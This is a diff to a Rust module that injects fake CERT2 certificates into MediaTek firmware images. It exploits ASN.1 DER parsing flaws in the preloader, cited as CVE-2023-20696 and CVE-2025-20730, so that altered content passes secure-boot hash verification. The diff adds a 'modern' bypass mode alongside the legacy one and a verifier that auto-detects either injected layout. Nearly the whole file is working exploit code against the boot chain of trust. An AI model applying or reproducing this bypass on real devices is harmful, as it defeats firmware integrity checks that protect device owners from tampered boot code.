@@ -1,15 +1,28 @@
-//! CERT2 fake certificate injection (legacy bypass_mode=1) and verification.
+//! CERT2 fake certificate injection and verification.
 //!
-//! This module exploits a vulnerability in the MTK preloader's ASN.1 DER
-//! parsing (CVE-2023-20696 / CVE-2025-20730). By prepending a crafted
-//! block to the CERT2 DER blob — a BIT STRING wrapping the original
-//! certificate followed by a context-tagged (0xA0) hash override block —
-//! the preloader reads the injected hashes instead of the real ones,
-//! allowing any logo content to pass verification.
+//! Two bypass modes are supported:
+//!
+//! - **Legacy** (bypass_mode=1, `--legacy` or default): Prepends
+//!   `BIT_STRING(original_DER) + 0xA0(hash_override)` before the original
+//!   CERT2 blob. Old libsec enters the BIT STRING payload to find the
+//!   original 0x30 SEQUENCE. (CVE-2023-20696)
+//!
+//! - **Modern** (`--modern`): Prepends only `0xA0(hash_override)` as a
+//!   top-level sibling before the original CERT2 DER SEQUENCE. New libsec
+//!   reads the 0xA0 override block directly. (CVE-2025-20730)
 
 use crate::part_header;
 use crate::asn1_der;
 use sha2::{Sha256, Sha384, Digest};
+
+/// Bypass mode for cert injection.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum BypassMode {
+    /// Legacy: `BIT_STRING(original_DER) + 0xA0(hash_override)` (bypass_mode=1).
+    Legacy,
+    /// Modern: `0xA0(hash_override)` as top-level sibling before original DER.
+    Modern,
+}
 
 /// Determine the hash algorithm name from digest length.
 fn algorithm_from_digest_length(len: usize) -> Option<&'static str> {
@@ -97,8 +110,6 @@ fn splice_cert2_blob(
     let mut padded_blob = new_blob.to_vec();
     padded_blob.extend(std::iter::repeat(0u8).take(padding));
 
-    // Splice: replace [cert2_blob_offset .. cert2_blob_offset + old_padded_size]
-    // with the new padded blob.
     let old_end = cert2_blob_offset + old_padded_size;
     let mut out = Vec::with_capacity(image.len() - old_padded_size + new_padded_size);
     out.extend_from_slice(&image[..cert2_blob_offset]);
@@ -106,7 +117,6 @@ fn splice_cert2_blob(
     if old_end < image.len() {
         out.extend_from_slice(&image[old_end..]);
     }
-    // Update data_size at offset 4 from cert2_header_offset.
     out[cert2_header_offset + 4..cert2_header_offset + 8]
         .copy_from_slice(&(new_data_size as u32).to_le_bytes());
     out
@@ -130,16 +140,17 @@ fn build_hash_override_block(header_digest: &[u8], image_digest: &[u8]) -> Vec<u
     out
 }
 
-/// Inject a legacy fake certificate into the image (bypass_mode=1).
+/// Inject a fake certificate into the image.
 ///
-/// This prepends `BIT_STRING(original_DER) + 0xA0(hash_override)` before the
-/// original CERT2 blob. The preloader reads the injected hashes, matching
-/// the current image content, so verification passes.
+/// - `BypassMode::Legacy` (default): Prepends `BIT_STRING(original_DER) +
+///   0xA0(hash_override)` before the original CERT2 blob.
+/// - `BypassMode::Modern`: Prepends `0xA0(hash_override)` as a top-level
+///   sibling before the original CERT2 DER SEQUENCE.
 ///
-/// The operation is idempotent: if a previous install's prefix is detected,
-/// it is stripped before re-injecting.
-pub fn inject_fake_cert(image: &[u8]) -> anyhow::Result<Vec<u8>> {
-    println!("Image: {} bytes", image.len());
+/// Both modes are idempotent: if a previous injection is detected, it is
+/// stripped before re-injecting.
+pub fn inject_fake_cert(image: &[u8], mode: BypassMode) -> anyhow::Result<Vec<u8>> {
+    println!("Image: {} bytes  mode: {:?}", image.len(), mode);
 
     let parts = part_header::parse_all_parts(image);
     if parts.is_empty() {
@@ -158,16 +169,18 @@ pub fn inject_fake_cert(image: &[u8]) -> anyhow::Result<Vec<u8>> {
         cert2_hdr_offset, cert2_blob_offset, cert2_header.data_size
     );
 
-    // Idempotent: strip any previous install's prefix.
-    let original_der = asn1_der::strip_legacy_wrapper(der_blob);
+    // Idempotent: strip any previous injection.
+    let original_der = asn1_der::strip_injection(der_blob);
+    let original_der: &[u8] = original_der.as_ref();
     if original_der.len() != der_blob.len() {
         println!(
-            "[INFO] existing legacy prefix detected and stripped ({} bytes); will re-inject",
+            "[INFO] existing injection detected and stripped ({} bytes); will re-inject",
             der_blob.len() - original_der.len()
         );
     }
 
-    // Find the original CERT2 DER SEQUENCE (0x30) within the blob.
+    // For legacy mode, we need the original CERT2 DER SEQUENCE (0x30) to wrap.
+    // For modern mode, we inject directly into the root SEQUENCE.
     let (original_cert2_der, original_relative_offset) =
         asn1_der::find_original_cert2_sequence(original_der)?;
     println!(
@@ -182,7 +195,7 @@ pub fn inject_fake_cert(image: &[u8]) -> anyhow::Result<Vec<u8>> {
         (Some(h), Some(i)) if !h.is_empty() && !i.is_empty() => (h, i),
         _ => anyhow::bail!("Image Header Hash / Image Hash OID not found in CERT2"),
     };
-    let old_header_digest = &header_hash_bit[1..]; // skip unused-bits prefix
+    let old_header_digest = &header_hash_bit[1..];
     let old_image_digest  = &image_hash_bit[1..];
     let algorithm = algorithm_from_digest_length(old_header_digest.len())
         .or_else(|| algorithm_from_digest_length(old_image_digest.len()))
@@ -202,16 +215,29 @@ pub fn inject_fake_cert(image: &[u8]) -> anyhow::Result<Vec<u8>> {
     println!("  old image  hash: {}", hex::encode(old_image_digest));
     println!("  new image  hash: {}", hex::encode(&new_image_digest));
 
-    // Build the legacy prefix: BIT STRING(original DER) + 0xA0 hash override.
-    let wrapper_block = asn1_der::build_bit_string_tlv(original_cert2_der);
     let override_block = build_hash_override_block(&new_header_digest, &new_image_digest);
-    println!("Legacy BIT STRING wrapper: {} bytes", wrapper_block.len());
     println!("Override block 0xA0: {} bytes", override_block.len());
 
-    let mut new_blob = Vec::new();
-    new_blob.extend_from_slice(&wrapper_block);
-    new_blob.extend_from_slice(&override_block);
-    new_blob.extend_from_slice(original_der);
+    let new_blob = match mode {
+        BypassMode::Legacy => {
+            // Legacy: BIT STRING(original DER) + 0xA0(override) + original DER
+            let wrapper_block = asn1_der::build_bit_string_tlv(original_cert2_der);
+            println!("Legacy BIT STRING wrapper: {} bytes", wrapper_block.len());
+            let mut blob = Vec::new();
+            blob.extend_from_slice(&wrapper_block);
+            blob.extend_from_slice(&override_block);
+            blob.extend_from_slice(original_der);
+            blob
+        }
+        BypassMode::Modern => {
+            // Modern: 0xA0(override) as top-level sibling before original DER.
+            // This matches sign_mtk_cert.py's approach: prefix_blocks + der
+            let mut blob = Vec::new();
+            blob.extend_from_slice(&override_block);
+            blob.extend_from_slice(original_der);
+            blob
+        }
+    };
 
     let output = splice_cert2_blob(
         image, cert2_blob_offset, cert2_hdr_offset, cert2_header, &new_blob
@@ -225,7 +251,7 @@ pub fn inject_fake_cert(image: &[u8]) -> anyhow::Result<Vec<u8>> {
 }
 
 /// Verify that a fake cert is installed and the injected hashes match the
-/// current image content.
+/// current image content. Auto-detects legacy vs modern layout.
 pub fn verify_fake_cert(image: &[u8], image_name: &str) -> anyhow::Result<()> {
     println!("Image: {}  Size: {} bytes", image_name, image.len());
     let parts = part_header::parse_all_parts(image);
@@ -252,27 +278,48 @@ pub fn verify_fake_cert(image: &[u8], image_name: &str) -> anyhow::Result<()> {
     let (_, cert2_hdr_offset, cert2_blob_offset, cert2_header) = cert2;
     let der_blob = &image[cert2_blob_offset..cert2_blob_offset + cert2_header.data_size as usize];
 
-    // Legacy layout: BIT STRING(wrapper) + 0xA0(override) + original DER
+    // Auto-detect layout: check if first TLV is BIT STRING (legacy) or 0xA0 (modern).
     let first_tlv = match asn1_der::parse_first_tlv(der_blob) {
         Some(f) => f,
         None => {
             println!(
-                "[FAIL] no legacy BIT STRING wrapper at start of CERT2 (hdr_off=0x{:08x}) - fake cert not installed",
+                "[FAIL] cannot parse CERT2 blob at hdr_off=0x{:08x} - no valid TLV",
                 cert2_hdr_offset
             );
             std::process::exit(1);
         }
     };
-    let is_bit_string = first_tlv.0 == 0 && first_tlv.2 == 3;
-    if !is_bit_string {
+
+    let is_legacy_bitstring = first_tlv.0 == 0 && first_tlv.2 == 3; // universal BIT STRING
+    let is_top_level_override = first_tlv.0 == 2 && first_tlv.1 && first_tlv.2 == 0; // ctx cons tag 0
+
+    if is_legacy_bitstring {
+        verify_legacy_layout(der_blob, cert2_hdr_offset, image, &target, first_tlv);
+    } else if is_top_level_override {
+        // Modern mode: 0xA0 override block as top-level sibling before original DER.
+        // This is the same structure as the override in legacy mode, just without
+        // the preceding BIT STRING wrapper.
+        verify_override_layout(der_blob, cert2_hdr_offset, image, &target, first_tlv);
+    } else {
+        // No injection detected — could be original unmodified image
         println!(
-            "[FAIL] no legacy BIT STRING wrapper at start of CERT2 (hdr_off=0x{:08x}) - fake cert not installed",
-            cert2_hdr_offset
+            "[FAIL] no fake cert detected at CERT2 (hdr_off=0x{:08x}) - first tag is class={} num={}",
+            cert2_hdr_offset, first_tlv.0, first_tlv.2
         );
         std::process::exit(1);
     }
-    let wrapper_size = first_tlv.4;
+    Ok(())
+}
 
+/// Verify legacy layout: BIT STRING(wrapper) + 0xA0(override) + original DER
+fn verify_legacy_layout(
+    der_blob: &[u8],
+    cert2_hdr_offset: usize,
+    image: &[u8],
+    target: &(usize, usize, usize, &part_header::PartHeader),
+    first_tlv: (u8, bool, u32, usize, usize),
+) {
+    let wrapper_size = first_tlv.4;
     let after_wrapper = &der_blob[first_tlv.4..];
     let second_tlv = match asn1_der::parse_first_tlv(after_wrapper) {
         Some(s) => s,
@@ -295,6 +342,50 @@ pub fn verify_fake_cert(image: &[u8], image_name: &str) -> anyhow::Result<()> {
     let override_size = second_tlv.4;
 
     let override_content = &after_wrapper[second_tlv.3..second_tlv.4];
+    verify_override_block(
+        override_content,
+        cert2_hdr_offset,
+        image,
+        target,
+        "legacy",
+        wrapper_size,
+        override_size,
+    );
+}
+
+/// Verify modern layout: 0xA0(override) as top-level sibling, then original DER.
+/// This is simpler than legacy — no BIT STRING wrapper, just the override block
+/// directly prepended.
+fn verify_override_layout(
+    der_blob: &[u8],
+    cert2_hdr_offset: usize,
+    image: &[u8],
+    target: &(usize, usize, usize, &part_header::PartHeader),
+    first_tlv: (u8, bool, u32, usize, usize),
+) {
+    let override_size = first_tlv.4;
+    let override_content = &der_blob[first_tlv.3..first_tlv.4];
+    verify_override_block(
+        override_content,
+        cert2_hdr_offset,
+        image,
+        target,
+        "modern",
+        0, // no wrapper in modern mode
+        override_size,
+    );
+}
+
+/// Shared logic: extract hashes from override block and compare with current image.
+fn verify_override_block(
+    override_content: &[u8],
+    cert2_hdr_offset: usize,
+    image: &[u8],
+    target: &(usize, usize, usize, &part_header::PartHeader),
+    mode_label: &str,
+    wrapper_size: usize,
+    override_size: usize,
+) {
     let injected_header_hash = asn1_der::find_bit_string_after_oid(override_content, asn1_der::OID_IMAGE_HEADER_HASH);
     let injected_image_hash  = asn1_der::find_bit_string_after_oid(override_content, asn1_der::OID_IMAGE_HASH);
     let (injected_header_hash, injected_image_hash) = match (injected_header_hash, injected_image_hash) {
@@ -320,12 +411,14 @@ pub fn verify_fake_cert(image: &[u8], image_name: &str) -> anyhow::Result<()> {
         }
     };
 
-    let (header_bytes, data_bytes) = extract_hash_inputs(image, &target);
+    let (header_bytes, data_bytes) = extract_hash_inputs(image, target);
     let current_header_digest = compute_hash_digest(&header_bytes, algorithm);
     let current_image_digest  = compute_hash_digest(&data_bytes, algorithm);
 
-    println!("CERT2 hdr_off=0x{:08x}  legacy layout detected", cert2_hdr_offset);
-    println!("  BIT STRING wrapper: {} bytes", wrapper_size);
+    println!("CERT2 hdr_off=0x{:08x}  {} layout detected", cert2_hdr_offset, mode_label);
+    if wrapper_size > 0 {
+        println!("  BIT STRING wrapper: {} bytes", wrapper_size);
+    }
     println!("  0xA0 override block: {} bytes", override_size);
     println!("Algorithm: {}", algorithm);
     println!("  injected header hash: {}", hex::encode(injected_header_digest));
@@ -336,12 +429,11 @@ pub fn verify_fake_cert(image: &[u8], image_name: &str) -> anyhow::Result<()> {
     let header_match = injected_header_digest == current_header_digest.as_slice();
     let image_match  = injected_image_digest == current_image_digest.as_slice();
     if header_match && image_match {
-        println!("[OK] fake cert installed and hashes match current image content (valid)");
+        println!("[OK] fake cert installed ({}) and hashes match current image content (valid)", mode_label);
     } else {
-        println!("[WARN] fake cert installed but hashes do not match current image content (content changed, re-install needed)");
+        println!("[WARN] fake cert installed ({}) but hashes do not match current image content (content changed, re-install needed)", mode_label);
         if !header_match { println!("  - header hash mismatch"); }
         if !image_match  { println!("  - image hash mismatch"); }
         std::process::exit(1);
     }
-    Ok(())
 }
